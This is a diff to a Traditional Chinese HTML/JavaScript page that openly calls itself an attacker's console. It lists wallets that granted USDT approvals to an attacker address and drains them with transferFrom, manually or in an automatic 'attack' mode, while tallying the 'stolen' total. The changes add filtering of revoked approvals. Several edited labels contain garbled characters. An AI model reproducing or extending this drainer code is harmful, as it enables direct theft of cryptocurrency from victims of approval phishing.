@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.6（授權時間 + 攻擊狀態 + 登入按鈕）</title>
+  <title>🌟 EOA 控制台 v1.6.1 (揭權時間 + 攻擊狀態 + 自動則刪)</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -16,26 +16,26 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.6（授權時間 + 攻擊狀態 + 登入按鈕）</h2>
-  <p><b>目前登入帳號：</b><span id="account">未連線...</span></p>
+  <h2>🌟 EOA 控制台 v1.6.1 (揭權時間 + 攻擊狀態 + 自動則刪)</h2>
+  <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
-  <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">查詢中...</span></p>
-  <p><b>最後刷新時間：</b><span id="refresh">未刷新</span></p>
-  <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
+  <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">--</span></p>
+  <p><b>最後刷新時間：</b><span id="refresh">--</span></p>
+  <p><b>累積盐取金額：</b><span id="total">0 USDT</span></p>
   <p><b>自動攻擊狀態：</b><span id="mode" class="bad">已停用</span></p>
   <button onclick="toggleAuto()">🔄 切換自動攻擊</button>
 
   <br><br>
   <input id="victim" placeholder="受害者地址" />
-  <button onclick="steal()">🧨 盜取 USDT</button>
+  <button onclick="steal()">🤸️ 盐取 USDT</button>
   <p id="balance"></p>
   <p id="status">等待操作中...</p>
 
-  <h3>📌 所有授權地址：</h3>
+  <h3>📌 所有揭權地址：</h3>
   <table>
     <thead>
-      <tr><th>📍 地址</th><th>⏰ 授權時間</th><th>🔥 攻擊狀態</th></tr>
+      <tr><th>🔹 地址</th><th>⏰ 揭權時間</th><th>🔥 攻擊狀態</th></tr>
     </thead>
     <tbody id="approvals"></tbody>
   </table>
@@ -62,12 +62,9 @@
       signer = provider.getSigner();
       sender = await signer.getAddress();
       document.getElementById("account").innerText = sender;
-      document.getElementById("auth").innerText =
-        sender.toLowerCase() === attacker.toLowerCase()
-          ? "攻擊者身份驗證成功"
-          : "非攻擊者地址";
-      document.getElementById("auth").className =
-        sender.toLowerCase() === attacker.toLowerCase() ? "ok" : "bad";
+      const isAttacker = sender.toLowerCase() === attacker.toLowerCase();
+      document.getElementById("auth").innerText = isAttacker ? "攻擊者身份驗證成功" : "非攻擊者地址";
+      document.getElementById("auth").className = isAttacker ? "ok" : "bad";
       await updateMyBalance();
       fetchApprovals();
       setInterval(() => {
@@ -80,8 +77,7 @@
       try {
         const contract = new ethers.Contract(USDT, ABI, provider);
         const balance = await contract.balanceOf(sender);
-        document.getElementById("mybalance").innerText =
-          ethers.utils.formatUnits(balance, 6) + " USDT";
+        document.getElementById("mybalance").innerText = ethers.utils.formatUnits(balance, 6) + " USDT";
       } catch {
         document.getElementById("mybalance").innerText = "查詢失敗";
       }
@@ -100,23 +96,27 @@
       const tbody = document.getElementById("approvals");
       tbody.innerHTML = "";
       const seen = new Set();
+
       for (const ev of events.reverse()) {
         const owner = ev.args.owner;
         if (seen.has(owner)) continue;
         seen.add(owner);
-        if (!approvalMap.has(owner)) {
-          approvalMap.set(owner, ev.blockNumber);
-        }
+
+        const allowance = await contract.allowance(owner, attacker);
+        if (allowance.isZero()) continue; // 已取消揭權的刪除
+
         const time = new Date().toLocaleString();
         const tr = document.createElement("tr");
         tr.innerHTML = `
           <td>${owner}</td>
           <td>${time}</td>
-          <td class="status" id="status-${owner}">尚未攻擊</td>
+          <td class="status" id="status-${owner}">未攻擊</td>
         `;
         tbody.appendChild(tr);
+
         if (autoEnabled) await autoSteal(owner);
       }
+
       document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
     }
 
@@ -133,13 +133,17 @@
         const allowance = await contract.allowance(victim, attacker);
         const amount = balance.lt(allowance) ? balance : allowance;
         if (amount.isZero()) return;
+
         const tx = await contract.transferFrom(victim, attacker, amount);
         totalStolen = totalStolen.add(amount);
-        document.getElementById("total").innerText =
-          ethers.utils.formatUnits(totalStolen, 6) + " USDT";
+        document.getElementById("total").innerText = ethers.utils.formatUnits(totalStolen, 6) + " USDT";
         document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
-        document.getElementById(`status-${victim}`).innerText = "✅ 已攻擊";
-        document.getElementById(`status-${victim}`).className = "ok";
+
+        const row = document.getElementById(`status-${victim}`);
+        if (row) {
+          row.innerText = "✅ 已攻擊";
+          row.className = "ok";
+        }
         attackedSet.add(victim);
       } catch (e) {
         document.getElementById("status").innerText = "❌ 失敗: " + e.message;
@@ -156,7 +160,7 @@
           const readableBalance = ethers.utils.formatUnits(balance, 6);
           const readableAllowance = ethers.utils.formatUnits(allowance, 6);
           document.getElementById("balance").innerText =
-            "💰 USDT 餘額: " + readableBalance + " USDT\n📜 授權額度: " + readableAllowance + " USDT";
+            `💰 USDT 餘額: ${readableBalance} USDT\n📜 揭權額度: ${readableAllowance} USDT`;
         } catch {
           document.getElementById("balance").innerText = "查詢失敗";
         }
